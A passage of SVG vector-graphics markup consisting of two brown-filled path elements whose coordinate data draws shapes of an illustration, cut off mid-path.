    <path id="path4031" d="m1908.5 2361.1c-139.62-48.871-245.77-95.666-307.33-135.49-11.597-7.5014-11.277-7.0159-18.164-27.609-8.1888-24.487-11.817-42.373-12.676-62.5-0.9251-21.654 2.1172-39.085 9.6201-55.119 12.863-27.489 37.118-47.307 71.285-58.246 12.368-3.96 31.67-7.8255 43.267-8.665l9-0.6515 47.482 17.591c26.115 9.675 48.257 17.591 49.205 17.591 0.9715 0 4.3153-3.3806 7.6655-7.75 3.2683-4.2625 11.276-13.997 17.795-21.632l11.853-13.882 19.5-6.0704 19.5-6.0704 18.939-0.3403c11.51-0.2069 19.943 0.064 21.5 0.6901 1.4185 0.5708 49.854 3.0556 108.56 5.5695 58.3 2.4965 126.25 5.4074 151 6.4687 24.75 1.0614 55.575 2.2106 68.5 2.554 25.946 0.6893 31.92 1.3865 43.044 5.0239 32.261 10.548 57.969 44.46 70.532 93.04 3.1686 12.253 3.5175 14.785 2.9464 21.382-3.4215 39.521-25.57 74.076-64.022 99.887-11.084 7.4398-27.846 16.304-39.832 21.064l-7.8317 3.11-84.529-5.5126c-46.491-3.032-84.929-5.2654-85.418-4.9631-0.4891 0.3022-0.8929 4.0105-0.8974 8.2405-0.012 11.348-1.7492 24.816-4.1521 32.191-11.854 36.386-47.112 62.921-102.34 77.021-15.228 3.8879-30.329 6.5053-43 7.453-6.4888 0.4854-8.0224 0.1658-21-4.3767zm38-13.527c9.35-1.4567 19.475-3.4964 22.5-4.5327 26.75-9.164 54.472-25.147 75.463-43.508 6.898-6.0335 12.748-11.658 12.999-12.5 0.2516-0.8414 1.4186-7.1549 2.5933-14.03 2.1684-12.69 2.1549-26.686-0.031-32.436-0.494-1.2992-1.8618-9.9452-3.0395-19.213-3.4253-26.955-5.5316-35.767-11.797-49.351-3.5652-7.7301-4.9532-9.0846-16.688-16.285-9.1135-5.5921-14.54-8.245-29-14.176-4.4-1.8049-23.3-9.6979-42-17.54-18.7-7.8422-38.05-15.947-43-18.01-4.95-2.0635-13.5-5.6405-19-7.9488-16.421-6.8916-31.149-12.945-46.395-19.068-16.262-6.5309-15.665-6.5314-27.934 0.026-13.912 7.4353-34.162 25.946-43.869 40.1-15.693 22.882-26.293 54.252-29.365 86.902-0.5433 5.775-1.4164 14.325-1.9402 19-1.2948 11.556 1.0525 48.26 3.3733 52.748 0.8888 1.7188 2.1221 3.4378 2.7406 3.8201 1.5352 0.9487 29.536 12.617 57.39 23.915 12.65 5.1311 38.075 15.48 56.5 22.998 18.425 7.5178 36.65 14.923 40.5 16.457 3.85 1.5335 8.8 3.5259 11 4.4275 4.6068 1.8878 5.8507 1.8108 29-1.7956zm-209.15-77.093c-2.1166-54.535-2.2335-60.671-1.3039-68.477 4.1651-34.977 14.13-63.893 30.488-88.469 7.5741-11.379 22.082-26.552 33.561-35.099 4.8997-3.6482 8.9085-6.8287 8.9085-7.068 0-0.6847-7.6678-3.8008-22.665-9.2107-7.6091-2.7447-29.738-10.877-49.175-18.072-37.458-13.865-37.64-13.908-50.66-12.034-42.172 6.071-71.907 22.903-87.624 49.599-7.8898 13.402-10.792 24.816-11.268 44.321-0.6028 24.682 3.0696 42.863 15.257 75.532 1.6053 4.3033 2.8942 5.7158 9.25 10.137 4.0616 2.8251 14.585 9.2383 23.385 14.251 27.891 15.889 96.908 49.412 100.5 48.815 1.072-0.1781 1.456-1.3841 1.3457-4.226zm525.61-37.38c47.992-22.238 78.631-56.794 85.633-96.578 1.8146-10.311 1.7818-15.787-0.1449-24.206-9.2493-40.419-29.504-71.904-54.464-84.662-13.904-7.1068-17.151-7.5099-69.477-8.6259-25.3-0.5396-70.178-1.525-99.729-2.1899-29.551-0.6648-54.047-0.8908-54.436-0.5021-0.6631 0.6631-3.332 20.398-6.7845 50.168-3.1341 27.024-4.8683 53.784-4.9576 76.5l-0.093 23.5 4.2345 18c2.3289 9.9 4.745 22.724 5.3691 28.498 1.6554 15.315 1.1255 14.61 11.57 15.395 9.4039 0.7069 64.826 4.271 118.33 7.6093 17.875 1.1154 33.625 2.1994 35 2.4089s6.1 0.2934 10.5 0.1863c7.3582-0.179 8.9188-0.6204 19.453-5.5018zm-217.23-90.606c0.5852-15.869 2.5373-45.518 3.8839-58.99 1.789-17.898 7.1609-63.671 8.0046-68.205 0.5183-2.7858 0.2885-3.2699-1.7565-3.6998-1.2941-0.272-41.118-2.1433-88.497-4.1584l-86.144-3.6637-17.356 5.2121c-9.5456 2.8667-18.315 5.7302-19.488 6.3635-3.1087 1.6783-29.369 33.055-29.369 35.091 0 0.6533 3.8197 2.4118 17.5 8.0565 10.777 4.4468 67.354 28.125 86 35.992 8.25 3.4808 35.7 14.948 61 25.483s49.825 21.37 54.5 24.078c4.675 2.7077 9.175 4.8124 10 4.6772 1.1091-0.1818 1.5576-1.807 1.7209-6.2361zm-545.8-253.2c-52.193-5.5287-96.051-22.084-138.58-52.311-17.868-12.698-39.665-31.44-52.444-45.09-3.6107-3.8571-7.3048-6.1556-18.258-11.36-7.5522-3.5886-73.015-40.44-145.47-81.893-72.4-41.4-203.92-116.6-292.2-167.1s-165.51-94.7-171.63-98.2l-11.131-6.3136-12.509-16.76c-13.867-18.579-18.047-26.211-27.245-49.741-16.167-41.359-25.584-80.2-30.676-126.52-1.9435-17.68-1.6266-71.266 0.51745-87.5 3.75-28.394 9.4469-53.922 17.24-77.253 36.753-110.03 121.66-200.21 255.34-271.2 24.237-12.871 34.719-15.986 53.94-16.032 14.59-0.0346 25.005 2.8951 77.874 21.905 27.381 9.8451 73.183 26.306 101.78 36.58 73.2 26.296 176.77 63.525 197.5 70.995 9.625 3.4678 32.8 11.794 51.5 18.502s50.875 18.268 71.5 25.689c20.625 7.4209 49.331 17.726 63.792 22.901l26.292 9.4084 12.208-0.0261c6.7143-0.0143 19.183-0.47576 27.708-1.0254 40.471-2.6091 65.802 0.082 101 10.73 23.158 7.0059 62.742 24.812 79.631 35.821 4.8174 3.1401 14.154 7.8201 21.233 10.643 34.589 13.794 62.578 31.909 89.558 57.964 7.3425 7.0907 15.927 16.042 19.077 19.892 3.1498 3.85 6.3047 7 7.0108 7 0.7062 0 4.0435-1.3692 7.4163-3.0426 18.624-9.2404 52.073-21.067 78.573-27.782 56.915-14.421 111.31-20.116 180-18.843 47.979 0.8891 85.504 3.6751 125 9.2806 76.298 10.829 131.05 27.566 171.5 52.429 11.052 6.7928 25.647 18.68 31.796 25.895l4.2957 5.0411 1.4463 19.761c2.2092 30.185 2.3331 28.887-3.6769 38.522-10.48 16.802-16.636 24.492-21.899 27.356l-4.962 2.7007-0.014 5.591c-0.01 3.0751 0.5158 18.191 1.1628 33.591l1.1765 28-3.8034 12.61-3.8034 12.61-8.9656 9.6626c-8.8326 9.519-9.2015 9.7818-24.855 17.699-12.166 6.1531-15.995 8.5502-16.339 10.227-0.247 1.2048-0.6678 9.3905-0.935 18.19-0.2673 8.8-1.4115 22.94-2.5427 31.422l-2.0568 15.422-4.7224 6.0779c-2.5974 3.3429-7.0634 9.0418-9.9245 12.664l-5.202 6.5865-16.838 5.6255c-55.15 18.426-116.4 31.138-174.84 36.286-25.929 2.2841-73.947 2.2774-97-0.014-31.568-3.1372-63.401-9.4373-89.023-17.619-9.9595-3.1802-32.437-11.846-37.448-14.437-1.4559-0.7529-3.1189-1.0642-3.6957-0.6919-0.5767 0.3724-2.2951 6.077-3.8187 12.677-24.66 106.83-81.882 207.7-157.01 276.8-36.733 33.782-74.786 59.161-115.81 77.239-34.093 15.025-87.209 29.102-122.4 32.44-10.114 0.9591-37.487 1.1611-45.293 0.3343zm116-121.44c12.577-2.716 16.158-3.9657 27-9.4247 10.838-5.4567 13.243-7.1347 18.088-12.619 9.9479-11.261 18.629-25.606 23.937-39.555 4.462-11.725 5.1062-14.571 7.8704-34.77l3.0107-22-2.3774-13.364c-1.9927-11.202-2.845-13.952-5.2675-17-1.5896-1.9997-5.3073-6.7858-8.2616-10.636-9.1966-11.985-20.622-25.348-36.764-43-8.5504-9.35-17.174-18.8-19.164-21-1.9901-2.2-11.012-12.1-20.048-22-18.71-20.498-17.86-20.038-30.559-16.554-24.383 6.6895-52.946 28.834-84.565 65.563-15.095 17.535-40.896 53.207-40.898 56.546 0 4.0748 20.789 31.83 46.999 62.741 4.125 4.8648 12.659 15.338 18.964 23.275 11.467 14.433 23.224 26.686 38.853 40.49 6.6684 5.89 9.9389 7.9716 16.5 10.502 17.214 6.6387 26.384 7.19 46.683 2.8066zm-214.72-7.8711c19.657-6.0805 37.853-26.5 49.862-55.955 6.7656-16.595 6.8228-17.558 2.2697-38.188-3.8184-17.301-3.8494-17.383-10.122-26.771-3.4604-5.1797-6.2916-10.158-6.2916-11.063 0-3.673-18.283-28.036-30.397-40.504-5.5416-5.7038-7.1015-6.6626-16.949-10.418-25.191-9.6058-70.222-18.543-104.56-20.752l-10.409-0.6697 0.6709 9.5441c2.113 30.06 9.9349 68.736 19.168 94.779 13.651 38.502 28.301 64.333 49.577 87.408 7.99 8.6661 14.461 11.614 32.902 14.99 4.958 0.9077 17.639-0.3463 24.282-2.4011zm-142.9-38.2c-0.3893-0.6875-1.4896-2.15-2.4452-3.25-7.0765-8.1462-19.507-30.383-26.272-47-15.642-38.418-22.453-75.27-23.565-127.5l-0.6281-29.497-8.5-2.636c-4.675-1.4498-17.5-5.4333-28.5-8.8523-49.61-15.419-114.48-40.14-170-64.788-41.404-18.38-113.34-53.308-141.29-68.6-5.6571-3.0958-10.528-5.6287-10.825-5.6287-0.29675 0-3.5432-1.736-7.2144-3.8577s-12.3-6.9116-19.175-10.644c-47.361-25.713-103.87-59.273-152.73-90.7-13.094-8.4229-23.728-14.634-24.371-14.237-0.81794 0.5055-0.95054 4.4226-0.46787 13.822 2.0155 39.248 10.487 70.691 28.591 106.12 9.5314 18.651 20.731 35.664 25.743 39.105 2.054 1.4101 20.834 12.25 41.734 24.088s42.05 23.884 47 26.767c4.95 2.8836 31.05 17.753 58 33.043s50.575 28.815 52.5 30.055c1.925 1.2405 9.35 5.5032 16.5 9.4727 7.15 3.9694 19.075 10.705 26.5 14.967 7.425 4.2625 26.1 14.95 41.5 23.751 15.4 8.8004 31.15 17.807 35 20.014 3.85 2.2073 21.85 12.446 40 22.752s40.425 23.021 49.5 28.254c9.075 5.2331 23.475 13.447 32 18.253 8.525 4.8059 28.325 16.06 44 25.01 15.675 8.9494 31.875 18.174 36 20.499 4.125 2.3253 14.475 8.2885 23 13.252 14.677 8.5446 20.055 10.872 18.41 7.9677zm190.31-112.5c7.988-11.818 17.883-25.084 26.664-35.75 33.492-40.681 64.122-65.886 91.365-75.184 4.5372-1.5486 8.2497-3.323 8.25-3.9431s-2.587-4.2439-5.7495-8.0529-12.5-15.175-20.75-25.259c-8.25-10.083-17.7-21.576-21-25.539-3.3-3.9632-15.524-18.864-27.163-33.114-30.832-37.744-32.394-39.518-37.399-42.453-8.7781-5.1486-10.786-5.4565-35.438-5.4329-26.095 0.025-35.362 1.4616-51.273 7.9485-13.149 5.3608-18.895 9.1955-29.26 19.527-7.4663 7.4421-10.464 11.302-13.826 17.802-9.1597 17.708-12.546 32.272-12.601 54.2-0.052 20.613-1.2696 18.45 31.513 56 12.551 14.376 17.331 19.909 52.273 60.5 26.735 31.058 38.716 44.5 39.664 44.5 0.4648 0 2.5941-2.5875 4.7318-5.75zm707.3-100.3c31.047-1.8854 69.502-7.1319 101.54-13.854 25.102-5.2662 24.349-4.8461 25.185-14.06 0.464-5.1178 0.1585-6.7883-2.0777-11.359-5.3944-11.026-18.666-18.02-46.649-24.586-24.774-5.8126-69.443-9.6608-141-12.147-70.331-2.4438-98.071-5.9002-105.29-13.119-6.1513-6.1512-0.3621-7.6196 21.29-5.4 50.171 5.1431 112.29 4.7938 167.66-0.9426 45.546-4.7192 93.426-13.173 134.34-23.72 8.5287-2.1985 17.532-4.5158 20.007-5.1494 5.9368-1.5199 6.219-3.8011 1.621-13.104-11.532-23.334-37.105-36.78-84.121-44.231-14.363-2.2762-73.827-2.6814-97.2-0.6623l-17.2 1.4857-8.8002-4.6743c-13.247-7.0365-13.578-7.7139-3.3002-6.757 13.769 1.282 85.895 0.8988 100.5-0.534 60.212-5.9068 98.894-14.33 149.57-32.571 11.169-4.0206 38.696-16.095 47.988-21.05 5.5889-2.9801 6.5116-3.8754 6.9452-6.7396 0.4379-2.8929 1.4659-3.8623 8.2813-7.8089 8.0275-4.6485 10.968-8.0202 21.61-24.781l3.3493-5.275-1.2273-20.225-1.2274-20.225-7.643-7.3429c-39.901-38.334-125.23-63.721-248.14-73.826-27.376-2.2507-116.18-2.5832-139-0.5205-66.214 5.9855-123.1 19.804-169.61 41.2-8.6579 3.983-10.092 5.1763-8.1275 6.7624 0.8675 0.7004 3.7878-0.1252 9.739-2.7533 43.05-19.011 101.26-31.44 176.5-37.685 26.506-2.2001 107.09-2.523 132.5-0.531 82.926 6.5009 143.74 19.697 187.8 40.754 20.99 10.03 33.177 18.992 41.869 30.787 4.7418 6.4345 8.3291 16.407 8.3291 23.154 0 10.513-6.78 23.607-17.129 33.08-29.774 27.254-99.777 49.169-186.37 58.346-37.859 4.0123-50.092 4.5746-98.5 4.5274-49.523-0.048-68.856-1.0539-106-5.5134-28.209-3.3869-69.857-11.024-87.122-15.975-4.194-1.2028-5.1058-0.247-3.8712 4.0579 1.9303 6.7305 5.9775 29.709 7.9218 44.977 5.7579 45.216 5.0898 92.154-1.9709 138.46-1.5876 10.411-1.7283 13.2-0.7165 14.203 1.7395 1.724 19.196 9.3471 31.259 13.651 30.286 10.805 60.761 17.326 96.5 20.648 22.771 2.117 55.23 2.5354 80 1.0312zm-858.76-72.607c7.2917-1.44 13.766-3.1275 14.387-3.75 0.621-0.6224 2.1662-5.7951 3.4339-11.495 2.302-10.351 2.3027-10.378 0.5779-22.896-3.0697-22.279-8.2937-45.741-10.185-45.741-2.2973 0-14.799 41.539-20.462 67.987-3.1938 14.918-3.5827 18.513-2.0022 18.513 0.5457 0 6.9582-1.1782 14.25-2.6183zm32.336-48.632c16.536-23.158 40.377-36.745 73.113-41.668 8.9124-1.3403 40.739-1.4088 48.702-0.1047 8.5642 1.4024 21.331 7.667 24.52 12.032 5.515 7.5481 9.4733 11.991 10.683 11.991 2.1638 0 3.805-10.869 3.775-25-0.024-11.489-0.4319-14.989-2.7363-23.499-2.6029-9.6123-7.2939-21.253-10.679-26.501-6.3703-9.8754-9.4238-14.168-13.356-18.775-8.1865-9.5907-9.2802-10.183-24.384-13.211-7.5661-1.5164-15.509-2.5501-17.715-2.3056-2.2 0.2438-12.325 1.5248-22.5 2.8467s-25.7 3.3223-34.5 4.4452c-23.512 3.0004-23.039 2.6804-33.216 22.499-9.7817 19.05-19.284 41.02-19.284 44.586 0 1.4067 0.6361 4.5504 1.4136 6.9859 2.1727 6.8061 7.3353 29.332 9.1507 39.928 1.5377 8.9746 2.0734 11 2.9095 11 0.1957 0 2.0429-2.3625 4.1047-5.25zm881-110.2c92.894-7.9089 163.27-26.315 197.41-51.63 33.888-25.127 20.058-51.908-38.914-75.348-30.167-11.991-77.741-22.528-126.5-28.018-40.214-4.5275-53.149-5.1405-107.5-5.0944-50.229 0.043-70.589 0.9482-97.616 4.3418-3.9049 0.4904-8.2365 0.6742-9.6259 0.4086-1.9889-0.3802-3.4547 0.4487-6.8922 3.8976-9.2154 9.2457-11.17 11.784-16.932 21.992-4.1923 7.4261-6.258 12.425-9.6352 23.317-3.0739 9.9134-4.2625 32.035-2.3775 44.246 1.2425 8.0494 7.1086 27.745 9.6653 32.452 0.8063 1.4844 2.1267 4.5714 2.9342 6.8601 1.9507 5.5288 8.1977 15.72 10.338 16.866 0.9393 0.5027 10.243 1.8328 20.674 2.9558 16.334 1.7584 27.547 2.6556 56.467 4.5181 14.859 0.957 101.73-0.3365 118.5-1.7646z" fill="#864d25"/>
    <path id="path4029" d="m1908.5 2361.1c-139.62-48.871-245.77-95.666-307.33-135.49-11.597-7.5014-11.277-7.0159-18.164-27.609-8.1888-24.487-11.817-42.373-12.676-62.5-0.9251-21.654 2.1172-39.085 9.6201-55.119 12.863-27.489 37.118-47.307 71.285-58.246 12.368-3.96 31.67-7.8255 43.267-8.665l9-0.6515 47.482 17.591c26.115 9.675 48.257 17.591 49.205 17.591 0.9715 0 4.3153-3.3806 7.6655-7.75 3.2683-4.2625 11.276-13.997 17.795-21.632l11.853-13.882 19.5-6.0704 19.5-6.0704 18.939-0.3403c11.51-0.2069 19.943 0.064 21.5 0.6901 1.4185 0.5708 49.854 3.0556 108.56 5.5695 58.3 2.4965 126.25 5.4074 151 6.4687 24.75 1.0614 55.575 2.2106 68.5 2.554 25.946 0.6893 31.92 1.3865 43.044 5.0239 32.261 10.548 57.969 44.46 70.532 93.04 3.1686 12.253 3.5175 14.785 2.9464 21.382-3.4215 39.521-25.57 74.076-64.022 99.887-11.084 7.4398-27.846 16.304-39.832 21.064l-7.8317 3.11-84.529-5.5126c-46.491-3.032-84.929-5.2654-85.418-4.9631-0.4891 0.3022-0.8929 4.0105-0.8974 8.2405-0.012 11.348-1.7492 24.816-4.1521 32.191-11.854 36.386-47.112 62.921-102.34 77.021-15.228 3.8879-30.329 6.5053-43 7.453-6.4888 0.4854-8.0224 0.1658-21-4.3767zm38-13.527c9.35-1.4567 19.475-3.4964 22.5-4.5327 26.75-9.164 54.472-25.147 75.463-43.508 6.898-6.0335 12.748-11.658 12.999-12.5 0.2516-0.8414 1.4186-7.1549 2.5933-14.03 2.1684-12.69 2.1549-26.686-0.031-32.436-0.494-1.2992-1.8618-9.9452-3.0395-19.213-3.4253-26.955-5.5316-35.767-11.797-49.351-3.5652-7.7301-4.9532-9.0846-16.688-16.285-9.1135-5.5921-14.54-8.245-29-14.176-4.4-1.8049-23.3-9.6979-42-17.54-18.7-7.8422-38.05-15.947-43-18.01-4.95-2.0635-13.5-5.6405-19-7.9488-16.421-6.8916-31.149-12.945-46.395-19.068-16.262-6.5309-15.665-6.5314-27.934 0.026-13.912 7.4353-34.162 25.946-43.869 40.1-15.693 22.882-26.293 54.252-29.365 86.902-0.5433 5.775-1.4164 14.325-1.9402 19-1.2948 11.556 1.0525 48.26 3.3733 52.748 0.8888 1.7188 2.1221 3.4378 2.7406 3.8201 1.5352 0.9487 29.536 12.617 57.39 23.915 12.65 5.1311 38.075 15.48 56.5 22.998 18.425 7.5178 36.65 14.923 40.5 16.457 3.85 1.5335 8.8 3.5259 11 4.4275 4.6068 1.8878 5.8507 1.8108 29-1.7956zm-209.15-77.093c-2.1166-54.535-2.2335-60.671-1.3039-68.477 4.1651-34.977 14.13-63.893 30.488-88.469 7.5741-11.379 22.082-26.552 33.561-35.099 4.8997-3.6482 8.9085-6.8287 8.9085-7.068 0-0.6847-7.6678-3.8008-22.665-9.2107-7.6091-2.7447-29.738-10.877-49.175-18.072-37.458-13.865-37.64-13.908-50.66-12.034-42.172 6.071-71.907 22.903-87.624 49.599-7.8898 13.402-10.792 24.816-11.268 44.321-0.6028 24.682 3.0696 42.863 15.257 75.532 1.6053 4.3033 2.8942 5.7158 9.25 10.137 4.0616 2.8251 14.585 9.2383 23.385 14.251 27.891 15.889 96.908 49.412 100.5 48.815 1.072-0.1781 1.456-1.3841 1.3457-4.226zm525.61-37.38c47.992-22.238 78.631-56.794 85.633-96.578 1.8146-10.311 1.7818-15.787-0.1449-24.206-9.2493-40.419-29.504-71.904-54.464-84.662-13.904-7.1068-17.151-7.5099-69.477-8.6259-25.3-0.5396-70.178-1.525-99.729-2.1899-29.551-0.6648-54.047-0.8908-54.436-0.5021-0.6631 0.6631-3.332 20.398-6.7845 50.168-3.1341 27.024-4.8683 53.784-4.9576 76.5l-0.093 23.5 4.2345 18c2.3289 9.9 4.745 22.724 5.3691 28.498 1.6554 15.315 1.1255 14.61 11.57 15.395 9.4039 0.7069 64.826 4.271 118.33 7.6093 17.875 1.1154 33.625 2.1994 35 2.4089s6.1 0.2934 10.5 0.1863c7.3582-0.179 8.9188-0.6204 19.453-5.5018zm-217.23-90.606c0.5852-15.869 2.5373-45.518 3.8839-58.99 1.789-17.898 7.1609-63.671 8.0046-68.205 0.5183-2.7858 0.2885-3.2699-1.7565-3.6998-1.2941-0.272-41.118-2.1433-88.497-4.1584l-86.144-3.6637-17.356 5.2121c-9.5456 2.8667-18.315 5.7302-19.488 6.3635-3.1087 1.6783-29.369 33.055-29.369 35.091 0 0.6533 3.8197 2.4118 17.5 8.0565 10.777 4.4468 67.354 28.125 86 35.992 8.25 3.4808 35.7 14.948 61 25.483s49.825 21.37 54.5 24.078c4.675 2.7077 9.175 4.8124 10 4.6772 1.1091-0.1818 1.5576-1.807 1.7209-6.2361zm-545.8-253.2c-52.193-5.5287-96.051-22.084-138.58-52.311-17.868-12.698-39.665-31.44-52.444-45.09-3.6107-3.8571-7.3048-6.1556-18.258-11.36-7.5522-3.5886-73.015-40.44-145.47-81.893-72.4-41.4-203.92-116.6-292.2-167.1s-165.51-94.7-171.63-98.2l-11.131-6.3136-12.509-16.76c-13.867-18.579-18.047-26.211-27.245-49.741-16.167-41.359-25.584-80.2-30.676-126.52-1.9435-17.68-1.6266-71.266 0.51745-87.5 3.75-28.394 9.4469-53.922 17.24-77.253 36.753-110.03 121.66-200.21 255.34-271.2 24.237-12.871 34.719-15.986 53.94-16.032 14.59-0.0346 25.005 2.8951 77.874 21.905 27.381 9.8451 73.183 26.306 101.78 36.58 73.2 26.296 176.77 63.525 197.5 70.995 9.625 3.4678 32.8 11.794 51.5 18.502s50.875 18.268 71.5 25.689c20.625 7.4209 49.331 17.726 63.792 22.901l26.292 9.4084 12.208-0.0261c6.7143-0.0143 19.183-0.47576 27.708-1.0254 40.471-2.6091 65.802 0.082 101 10.73 23.158 7.0059 62.742 24.812 79.631 35.821 4.8174 3.1401 14.154 7.8201 21.233 10.643 34.589 13.794 62.578 31.909 89.558 57.964 7.3425 7.0907 15.927 16.042 19.077 19.892 3.1498 3.85 6.3047 7 7.0108 7 0.7062 0 4.0435-1.3692 7.4163-3.0426 18.624-9.2404 52.073-21.067 78.573-27.782 56.915-14.421 111.31-20.116 180-18.843 47.979 0.8891 85.504 3.6751 125 9.2806 76.298 10.829 131.05 27.566 171.5 52.429 11.052 6.7928 25.647 18.68 31.796 25.895l4.2957 5.0411 1.4463 19.761c2.2092 30.185 2.3331 28.887-3.6769 38.522-10.48 16.802-16.636 24.492-21.899 27.356l-4.962 2.7007-0.014 5.591c-0.01 3.0751 0.5158 18.191 1.1628 33.591l1.1765 28-3.8034 12.61-3.8034 12.61-8.9656 9.6626c-8.8326 9.519-9.2015 9.7818-24.855 17.699-12.166 6.1531-15.995 8.5502-16.339 10.227-0.247 1.2048-0.6678 9.3905-0.935 18.19-0.2673 8.8-1.4115 22.94-2.5427 31.422l-2.0568 15.422-4.7224 6.0779c-2.5974 3.3429-7.0634 9.0418-9.9245 12.664l-5.202 6.5865-16.838 5.6255c-55.15 18.426-116.4 31.138-174.84 36.286-25.929 2.2841-73.947 2.2774-97-0.014-31.568-3.1372-63.401-9.4373-89.023-17.619-9.9595-3.1802-32.437-11.846-37.448-14.437-1.4559-0.7529-3.1189-1.0642-3.6957-0.6919-0.5767 0.3724-2.2951 6.077-3.8187 12.677-24.66 106.83-81.882 207.7-157.01 276.8-36.733 33.782-74.786 59.161-115.81 77.239-34.093 15.025-87.209 29.102-122.4 32.44-10.114 0.9591-37.487 1.1611-45.293 0.3343zm-161.5-92.3c-0.3399-0.55-1.068-1-1.618-1s-0.7219 0.45-0.382 1 1.068 1 1.618 1 0.7219-0.45 0.382-1zm-9.7006-10.141c-1.2647-1.8565-3.0878-4.2718-4.0514-5.3673-3.6815-4.1855-8.4167-10.106-10.294-12.869-1.9121-2.8155-7.3965-11.016-10.529-15.745-8.0004-12.075-25.054-45.697-29.863-58.878-6.4642-17.716-13.435-38.599-14.52-43.5-0.7307-3.3-2.2606-9.4201-3.3998-13.6-5.1661-18.956-10.849-60.979-12.055-89.138-0.8831-20.625 0.1268-56.937 1.8707-67.262 0.5574-3.3 1.7105-12.075 2.5625-19.5 2.4248-21.131 8.4909-53.93 12.022-65 0.7894-2.475 2.9768-9.9 4.8609-16.5 7.1176-24.932 14.586-46.212 24.041-68.5 4.6451-10.949 18.739-40.263 21.396-44.5 1.3795-2.2 4.1821-7.15 6.2282-11 7.6251-14.348 30.406-48.995 42.867-65.198 21.041-27.357 59.472-66.443 82.064-83.462 1.925-1.4501 4.4116-3.5059 5.5257-4.5684 1.1141-1.0626 3.3641-2.7826 5-3.8224s5.41-3.7038 8.387-5.9201c5.8023-4.3195 9.4261-6.6567 26.587-17.148 16.223-9.9178 22.863-13.472 38.705-20.718 47.34-21.654 90.449-31.231 137.54-30.556 14.858 0.2127 19.815-0.2624 16.146-1.5474-1.4419-0.505-2.9431-1.0482-18.893-6.8372-11.934-4.3312-31.058-9.0627-46-11.381-12.755-1.9786-28.697-2.1931-73.637-0.9906l-27.137 0.7261-15.863-5.5949c-8.7244-3.0772-18.113-6.466-20.863-7.5306-4.5846-1.7749-52.514-18.872-69-24.612-7.6226-2.6544-33.967-12.316-42.019-15.41-2.7607-1.0608-5.923-1.9287-7.0275-1.9287s-2.8983-0.62348-3.9863-1.3855c-1.0879-0.76203-3.5506-1.8625-5.4725-2.4455-1.9219-0.58302-6.6444-2.242-10.494-3.6865-3.85-1.4446-9.925-3.6617-13.5-4.927-8.7958-3.113-10.088-3.5795-37-13.353-12.925-4.694-25.75-9.3164-28.5-10.272-4.5545-1.5825-14.641-5.1685-47.5-16.888-6.325-2.2558-12.175-4.3759-13-4.7112-0.825-0.33538-8.25-2.9836-16.5-5.8849s-17.475-6.2574-20.5-7.4578c-3.025-1.2005-8.65-3.2406-12.5-4.5337-7.952-2.6708-13.733-4.7398-28-10.021-13.516-5.003-24.716-9.032-45.5-16.367-19.685-6.9474-37.051-13.202-44.5-16.028-2.75-1.0432-11.525-4.219-19.5-7.0574-17.319-6.1642-34.439-12.321-42-15.104-3.025-1.1135-7.6027-2.632-10.173-3.3746-2.5699-0.74256-5.4949-1.7845-6.5-2.3154-3.9613-2.0924-15.296-4.3682-24.327-4.8844-18.223-1.0415-33.161 3.8175-60 19.517-4.125 2.4129-10.2 5.9447-13.5 7.8485s-6.675 3.8625-7.5 4.3527c-0.825 0.49013-4.6996 2.688-8.6103 4.884-6.3566 3.5696-35.162 22.613-42.898 28.36-1.6546 1.2292-6.6046 4.9186-11 8.1987-40.483 30.211-77.209 67.666-106.21 108.32-30.698 43.03-54.019 101-61.676 153.32-6.0241 41.158-6.0792 77.775-0.17904 118.9 1.9346 13.485 7.3052 41.755 8.5489 45 0.52701 1.375 1.6168 5.425 2.4217 9 2.2134 9.8308 11.192 36.827 17.12 51.475 9.5264 23.538 9.9052 24.199 27.205 47.445 2.6278 3.5311 5.6779 7.2972 6.7779 8.3693 2.1953 2.1395 30.623 19.025 44.345 26.34 4.7603 2.5377 11.13 6.0977 14.155 7.911 9.8316 5.8935 24.191 14.149 39.379 22.641 16.101 9.0018 20.012 11.267 39.988 23.161 4.473 2.6634 11.058 6.413 14.633 8.3323s8.75 4.7985 11.5 6.3981c2.75 1.5995 7.25 4.0909 10 5.5362 2.75 1.4454 5.6229 3.1371 6.3842 3.7594 0.76129 0.6223 4.6073 2.9314 8.5467 5.1314 20.221 11.292 36.264 20.366 41.553 23.5 3.2484 1.925 9.4184 5.4856 13.711 7.9125 4.2927 2.4269 8.9299 5.1751 10.305 6.107 1.375 0.932 5.875 3.4819 10 5.6665 7.6899 4.0726 20.96 11.622 36 20.48 4.675 2.7535 13.45 7.7165 19.5 11.029 9.5038 5.2034 25.044 14.181 45.5 26.286 3.025 1.79 9.55 5.42 14.5 8.0667s13.95 7.7871 20 11.423c6.05 3.6361 16.625 9.7054 23.5 13.487 13.004 7.1535 28.262 15.878 36 20.585 2.475 1.5056 7.875 4.6594 12 7.0085 17.295 9.8491 35.768 20.403 39.5 22.568 2.2 1.276 5.8 3.2921 8 4.4803s8.725 4.9474 14.5 8.3537c5.775 3.4064 13.875 7.8946 18 9.9738s8.175 4.3362 9 5.0156 3.525 2.3599 6 3.7346 11.583 6.6328 20.24 11.685c8.6571 5.0519 22.607 12.506 31 16.565 14.393 6.9608 15.741 7.8647 23.734 15.918 4.6608 4.6963 8.6205 8.3924 8.7994 8.2135s-0.7095-1.8442-1.9742-3.7006zm287.2-18.99c12.577-2.716 16.158-3.9657 27-9.4247 10.838-5.4567 13.243-7.1347 18.088-12.619 9.9479-11.261 18.629-25.606 23.937-39.555 4.462-11.725 5.1062-14.571 7.8704-34.77l3.0107-22-2.3774-13.364c-1.9927-11.202-2.845-13.952-5.2675-17-1.5896-1.9997-5.3073-6.7858-8.2616-10.636-9.1966-11.985-20.622-25.348-36.764-43-8.5504-9.35-17.174-18.8-19.164-21-1.9901-2.2-11.012-12.1-20.048-22-18.71-20.498-17.86-20.038-30.559-16.554-24.383 6.6895-52.946 28.834-84.565 65.563-15.095 17.535-40.896 53.207-40.898 56.546 0 4.0748 20.789 31.83 46.999 62.741 4.125 4.8648 12.659 15.338 18.964 23.275 11.467 14.433 23.224 26.686 38.853 40.49 6.6684 5.89 9.9389 7.9716 16.5 10.502 17.214 6.6387 26.384 7.19 46.683 2.8066zm-214.72-7.8711c19.657-6.0805 37.853-26.5 49.862-55.955 6.7656-16.595 6.8228-17.558 2.2697-38.188-3.8184-17.301-3.8494-17.383-10.122-26.771-3.4604-5.1797-6.2916-10.158-6.2916-11.063 0-3.673-18.283-28.036-30.397-40.504-5.5416-5.7038-7.1015-6.6626-16.949-10.418-25.191-9.6058-70.222-18.543-104.56-20.752l-10.409-0.6697 0.6709 9.5441c2.113 30.06 9.9349 68.736 19.168 94.779 13.651 